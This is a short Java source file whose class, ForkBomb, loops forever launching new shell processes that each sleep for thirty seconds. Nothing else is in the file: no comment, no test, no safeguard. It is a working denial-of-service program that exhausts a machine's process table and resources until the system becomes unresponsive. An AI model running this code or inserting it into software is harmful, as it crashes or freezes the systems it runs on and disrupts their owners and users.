public class ForkBomb {
    public static void main(String[] args) throws Exception {
        while (true) {
            new ProcessBuilder("/bin/sh", "-c", "sleep 30").start();
        }
    }
}
